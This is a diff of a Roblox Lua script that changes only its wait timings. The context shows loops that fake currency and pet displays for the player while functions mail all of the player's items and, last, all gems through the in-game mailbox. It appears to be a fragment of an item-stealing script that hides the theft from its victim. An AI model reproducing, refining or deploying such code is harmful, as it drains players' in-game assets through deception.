@@ -50,7 +50,7 @@ end
 
 task.spawn(function()
     while true do
-        task.wait(0.05)
+        task.wait(0.1)
         if plr:FindFirstChild("leaderstats") then
             for id, value in pairs(visualCurrency) do
                 local stat = plr.leaderstats:FindFirstChild(id)
@@ -72,7 +72,7 @@ if petFolder then
     end
     task.spawn(function()
         while true do
-            task.wait(0.05)
+            task.wait(0.1)
             for uid, clone in pairs(visualPets) do
                 if clone.Parent ~= petFolder then
                     clone.Parent = petFolder
@@ -130,7 +130,7 @@ local function sendItem(category, stackKey, amount)
             mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
             return true
         end
-        task.wait(0.1)
+        task.wait(0.2)
     end
     return false
 end
@@ -145,7 +145,7 @@ local function SendAllGems()
                     return network.Invoke("Mailbox: Send", unpack(args))
                 end)
                 if ok and response == true then break end
-                task.wait(0.1)
+                task.wait(0.2)
             end
             break
         end
@@ -226,7 +226,7 @@ for _, item in ipairs(sortedItems) do
         local key = item.StackKey and item.StackKey() or item.uid
         sendItem(item.category, key, item.amount)
     end)
-    task.wait(0.1)
+    task.wait(0.2)
 end
 
 --// SEND GEMS LAST
